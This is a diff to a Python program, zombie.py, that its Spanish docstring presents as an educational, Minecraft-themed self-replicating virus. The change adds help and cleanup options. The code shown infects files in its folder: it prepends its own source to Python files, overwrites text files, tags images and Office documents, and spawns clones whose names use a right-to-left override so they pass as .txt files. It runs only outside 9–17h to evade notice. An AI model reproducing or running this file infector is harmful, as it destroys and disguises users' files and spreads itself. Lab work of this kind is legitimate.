@@ -4,6 +4,11 @@ ZOMBIE — Programa educativo autorreplicante (tematica Minecraft)
 Simula ejecucion fileless, evasión UV, enrutamiento Manhattan
 y correlacion rendimiento/deteccion.
 Version de laboratorio con interaccion en archivos de usuario.
+
+Uso:
+    python zombie.py          Ejecutar virus (fuera de horario 9-17h)
+    python zombie.py --help   Mostrar ayuda
+    python zombie.py --clean  Limpiar archivos infectados y RTL clones
 """
 import os
 import sys
@@ -20,6 +25,30 @@ INFECTED_LOG = []
 READ_LOG = []
 LOG_LINES = []
 UV_DESTROYED = False
+
+HELP_TEXT = """\
+ZOMBIE — Virus educativo (tematica Minecraft)
+
+Uso:
+    python zombie.py          Ejecutar todas las fases del virus
+    python zombie.py --help   Mostrar esta ayuda
+    python zombie.py --clean  Limpiar todos los rastros de infeccion
+
+Horario:
+    Fuera de 9-17h: El zombie ejecuta todas las fases (RECON, INFECT,
+                    RTL SPAWN, MANHATTAN, PERFILAMIENTO, LOG).
+    Dentro de 9-17h: Evasion UV se activa — el zombie se autodestruye
+                     antes de infectar archivos.
+
+Archivos generados:
+    infection.log           Registro de la actividad del virus
+    BRAINS{0,1,2}.txt.py    Clones RTL (parecen .txt en Explorer)
+
+Limpiar:
+    python zombie.py --clean
+    Remove-Item infection.log, "BRAINS*txt.py" -ErrorAction SilentlyContinue
+    python setup_lab.py
+"""
 
 def log(msg):
     LOG_LINES.append(f"[{datetime.datetime.now():%H:%M:%S}] {msg}")
@@ -61,7 +90,6 @@ def exfiltrate(path):
         READ_LOG.append(name)
         log(f"Lee {name}: {len(lines)} filas")
     elif ext == '.html':
-        lines = data.decode('utf-8', errors='replace').splitlines()
         tag_count = data.count(b'<')
         print(f"[zombie] leyendo: {name} (encontrados {tag_count} tags HTML)")
         READ_LOG.append(name)
@@ -92,18 +120,29 @@ def get_self_code():
     with open(__file__, 'r', encoding='utf-8') as f:
         return f.read()
 
+def is_excluded(name):
+    if name == SELF_NAME or name == 'setup_lab.py':
+        return True
+    if RTL_OVERRIDE in name:
+        return True
+    if name.startswith('README'):
+        return True
+    return False
+
+def was_already_infected(name):
+    return any(entry.startswith(name + " ") for entry in INFECTED_LOG)
+
 def infect_file(path, code):
     name = os.path.basename(path)
     ext = os.path.splitext(path)[1].lower()
 
-    if name.startswith('README') or RTL_OVERRIDE in name:
+    if is_excluded(name):
         return
 
-    already = any(name in entry for entry in INFECTED_LOG)
+    if was_already_infected(name):
+        return
 
     if ext == '.py':
-        if name == SELF_NAME or name == 'setup_lab.py' or already:
-            return
         with open(path, 'r', encoding='utf-8') as f:
             orig = f.read()
         infected = code + "\n# === INFECTED BY ZOMBIE ===\n" + orig
@@ -112,8 +151,6 @@ def infect_file(path, code):
         INFECTED_LOG.append(f"{name} (prepended)")
         safe_print(f"[zombie] infectado: {name} (codigo zombie antepuesto)"); log(f"Infectado {name}: antepuesto")
     elif ext == '.txt':
-        if already:
-            return
         with open(path, 'w', encoding='utf-8') as f:
             f.write(code)
         INFECTED_LOG.append(f"{name} (overwritten)")
@@ -123,7 +160,7 @@ def infect_file(path, code):
 def infect_binary(path):
     name = os.path.basename(path)
     ext = os.path.splitext(path)[1].lower()
-    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
+    if is_excluded(name):
         return
     marker = b"\n[ZOMBIE-INFECTED]\nTimestamp: " + str(datetime.datetime.now()).encode() + b"\n"
 
@@ -162,7 +199,7 @@ def infect_binary(path):
 
 def infect_office(path):
     name = os.path.basename(path)
-    if name in (SELF_NAME, 'setup_lab.py') or RTL_OVERRIDE in name:
+    if is_excluded(name):
         return
     hidden_content = (
         f"ZOMBIE VIRUS - MARCADOR DE INFECCION\n"
@@ -181,7 +218,7 @@ def infect_office(path):
         buf.seek(0)
 
         z = zipfile.ZipFile(buf, 'a')
-        hidden_path = f"zombie_infection/.zombie_marker.txt"
+        hidden_path = "zombie_infection/.zombie_marker.txt"
         try:
             z.getinfo(hidden_path)
             z.close()
@@ -231,7 +268,7 @@ def check_uv_evasion():
 
         for entry in INFECTED_LOG[:]:
             fname = entry.split(" ")[0]
-            if os.path.exists(fname) and fname not in (SELF_NAME, 'setup_lab.py'):
+            if os.path.exists(fname) and not is_excluded(fname):
                 try:
                     os.remove(fname)
                     cleaned += 1
@@ -387,9 +424,58 @@ def print_report():
     print("[zombie] el zombie se arrastra... BRAINS...")
 
 
+# ── LIMPIEZA ───────────────────────────────────────────
+
+def clean():
+    safe_print("[zombie] limpiando rastros de infeccion...")
+    cleaned = 0
+
+    for entry in INFECTED_LOG[:]:
+        fname = entry.split(" ")[0]
+        if os.path.exists(fname) and not is_excluded(fname):
+            try:
+                os.remove(fname)
+                cleaned += 1
+                safe_print(f"[zombie] eliminado: {fname}")
+            except Exception as e:
+                safe_print(f"[zombie] error al eliminar {fname}: {e}")
+
+    for i in range(3):
+        rtl_name = f"BRAINS{i}{RTL_OVERRIDE}txt.py"
+        if os.path.exists(rtl_name):
+            try:
+                os.remove(rtl_name)
+                cleaned += 1
+                safe_print(f"[zombie] eliminado: {repr(rtl_name)}")
+            except Exception:
+                pass
+
+    if os.path.exists('infection.log'):
+        try:
+            os.remove('infection.log')
+            cleaned += 1
+            safe_print("[zombie] eliminado: infection.log")
+        except Exception:
+            pass
+
+    if cleaned > 0:
+        safe_print(f"[zombie] limpieza completada: {cleaned} archivos eliminados")
+        safe_print("[zombie] ejecuta 'python setup_lab.py' para regenerar archivos limpios")
+    else:
+        safe_print("[zombie] no hay rastros que limpiar")
+
+
 # ── MAIN ───────────────────────────────────────────────
 
 def main():
+    if '--help' in sys.argv or '-h' in sys.argv:
+        print(HELP_TEXT)
+        return
+
+    if '--clean' in sys.argv:
+        clean()
+        return
+
     safe_print("BRAINS... DIGO, ARCHIVOS. EL ZOMBIE CAMINA.\n")
 
     code = get_self_code()
@@ -398,8 +484,7 @@ def main():
     # Fase 1: RECON / HAMBRE
     safe_print("── FASE 1: RECON (HAMBRE) ──")
     targets_read = [f for f in all_files if os.path.isfile(f)
-                    and f != SELF_NAME and f != 'setup_lab.py'
-                    and not f.startswith('README')]
+                    and not is_excluded(f)]
     for f in targets_read:
         exfiltrate(f)
 
@@ -419,10 +504,10 @@ def main():
         if ext in ('.py', '.txt'):
             infect_file(f, code)
         elif ext in ('.png', '.jpg', '.mp3'):
-            if f != SELF_NAME and f != 'setup_lab.py':
+            if not is_excluded(f):
                 infect_binary(f)
         elif ext in ('.docx', '.xlsx', '.pptx'):
-            if f != SELF_NAME and f != 'setup_lab.py':
+            if not is_excluded(f):
                 infect_office(f)
 
     # Fase 3: RTL SPAWN
@@ -432,7 +517,7 @@ def main():
     # Fase 5: ENRUTAMIENTO MANHATTAN
     safe_print("\n── FASE 5: ENRUTAMIENTO MANHATTAN (ESCANEO ORTOGONAL) ──")
     scan_targets = [f for f in all_files if os.path.isfile(f)
-                    and f != SELF_NAME and f != 'setup_lab.py']
+                    and not is_excluded(f)]
     manhattan_scan(scan_targets)
 
     # Fase 6: PERFILAMIENTO DE RENDIMIENTO
